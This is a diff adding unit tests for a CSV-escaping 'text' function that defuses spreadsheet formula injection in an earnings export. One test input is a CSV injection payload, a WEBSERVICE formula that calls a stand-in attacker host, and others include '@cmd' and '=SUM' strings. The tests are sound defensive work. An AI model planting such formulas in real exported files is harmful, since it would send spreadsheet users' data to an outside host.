@@ -1,5 +1,5 @@
 import type { SeriesPoint } from "./compute";
-import { earningsCsv, earningsRows } from "./csv";
+import { earningsCsv, earningsRows, text } from "./csv";
 
 const ROUND_START = Date.UTC(2026, 8, 1) / 1000;
 const CALLED = ROUND_START + 2 * 3600 + 17 * 60;
@@ -107,5 +107,24 @@ describe("earningsCsv", () => {
     expect(earningsCsv(rows, { lpt: [], eth: [] })).toContain(
       ",'=HYPERLINK(1),"
     );
+  });
+});
+
+describe("text", () => {
+  it("defuses anything a spreadsheet would run as a formula", () => {
+    expect(text('-1+WEBSERVICE("https://attacker.example")')).toBe(
+      '"\'-1+WEBSERVICE(""https://attacker.example"")"'
+    );
+    expect(text("=SUM(A1)")).toBe("'=SUM(A1)");
+    expect(text("@cmd")).toBe("'@cmd");
+    expect(text("\t=1")).toBe("'\t=1");
+  });
+
+  it("quotes line breaks, including a bare carriage return", () => {
+    expect(text("a\rb")).toBe('"a\rb"');
+  });
+
+  it("leaves ordinary labels alone", () => {
+    expect(text("Cold storage")).toBe("Cold storage");
   });
 });
